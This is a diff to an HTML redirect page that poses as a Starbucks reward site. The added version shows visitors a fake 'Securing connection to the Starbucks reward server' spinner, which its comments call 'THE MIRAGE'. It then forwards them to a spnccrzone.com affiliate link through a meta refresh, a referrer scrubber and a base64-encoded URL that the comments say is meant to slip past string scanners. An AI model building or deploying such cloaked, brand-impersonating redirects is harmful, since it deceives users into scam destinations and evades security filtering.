@@ -1,34 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting to Secure Content...</title>
-    <!-- THE REFRESH CLOAK: 0 SECOND JUMP -->
-    <meta http-equiv="refresh" content="0;url=https://spnccrzone.com/?nc2u=nI5IpsDgWGssC2iANdEA8GKypn2fHmgKvQJDRoz7h5U%3d&s1=">
+    
+    <!-- FAILSAFE 1: THE HARD-CODED META REFRESH (0 SECOND JUMP) -->
+    <!-- This runs even if JavaScript is disabled or crashes! -->
+    <meta id="meta-fallback" http-equiv="refresh" content="2;url=https://spnccrzone.com/?nc2u=nI5IpsDgWGssC2iANdEA8GKypn2fHmgKvQJDRoz7h5U%3d&s1=">
     
     <!-- THE REFERRER SCRUBBER: Total Stealth -->
     <meta name="referrer" content="no-referrer">
 
+    <!-- TAILWIND FOR THE LOADING UI -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { border: 3px solid rgba(0,0,0,.1); border-top: 3px solid #00704A; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        body { background-color: #ffffff; }
+        .spinner {
+            border: 4px solid rgba(0, 112, 74, 0.1);
+            border-left-color: #00704A;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .fade-in { animation: fadeIn 0.5s ease-in forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
-<body>
-    <div class="flex flex-col items-center">
-        <div class="spinner"></div>
-        <p style="margin-top: 15px; font-size: 14px; color: #666;">Securing connection...</p>
+<body class="flex items-center justify-center min-h-screen">
+
+    <div id="loading-ui" class="flex flex-col items-center text-center px-6 fade-in">
+        <!-- THE MIRAGE: Official-looking spinner -->
+        <div class="spinner mb-6"></div>
+        
+        <h1 class="text-[18px] font-bold text-gray-900 mb-2">Securing Connection...</h1>
+        <p class="text-[13px] text-gray-500 font-medium max-w-xs">
+            Please wait while we establish a secure link to the Starbucks reward server.
+        </p>
+
+        <!-- FAILSAFE 3: THE HUMAN-FALLBACK LINK (Visible after 5 seconds) -->
+        <div id="fallback-container" class="mt-8 hidden">
+            <p class="text-[12px] text-gray-400 mb-3">Taking too long?</p>
+            <a id="manual-link" href="#" class="text-[#00704A] font-bold text-[14px] underline decoration-2 underline-offset-4">
+                Click here to continue
+            </a>
+        </div>
     </div>
 
-    <!-- THE JAVASCRIPT FAIL-SAFE: The Active Strike -->
+    <!-- FAILSAFE 2: THE ENHANCED JAVASCRIPT STRIKE -->
     <script type="text/javascript">
-        // Base64 encoded affiliate link to bypass simple string scanners
-        const cipher = "aHR0cHM6Ly9zcG5jY3J6b25lLmNvbS8/bmMydT1uSTVJcHNEZ1dnc3NDMmlBTmRFQThHS3lwbjJmSG1nS3ZRSkRSb3o3aDVVJTNkJnMxPQ==";
-        
-        // Execute the redirect immediately
-        window.location.replace(atob(cipher));
+        (function() {
+            // THE TARGET (ENCODED FOR STEALTH)
+            const cipher = "aHR0cHM6Ly9zcG5jY3J6b25lLmNvbS8/bmMydT1uSTVJcHNEZ1dnc3NDMmlBTmRFQThHS3lwbjJmSG1nS3ZRSkRSb3o3aDVVJTNkJnMxPQ==";
+            
+            function initiateJump() {
+                try {
+                    const destination = atob(cipher);
+                    
+                    // Set the manual link just in case
+                    document.getElementById('manual-link').href = destination;
+
+                    // THE GHOST JUMP: Use replace to kill the history entry
+                    // Added a 1.5s delay to ensure the browser is "Warm"
+                    setTimeout(() => {
+                        window.location.replace(destination);
+                    }, 1500);
+
+                } catch (e) {
+                    console.error("Rebel Redirect Error:", e);
+                    // If atob fails, show the fallback container immediately
+                    document.getElementById('fallback-container').classList.remove('hidden');
+                }
+            }
+
+            // ACTIVATE ON LOAD
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initiateJump);
+            } else {
+                initiateJump();
+            }
+
+            // SHOW FALLBACK IF NO JUMP AFTER 5 SECONDS
+            setTimeout(() => {
+                document.getElementById('fallback-container').classList.remove('hidden');
+            }, 5000);
+        })();
     </script>
 </body>
 </html>
-
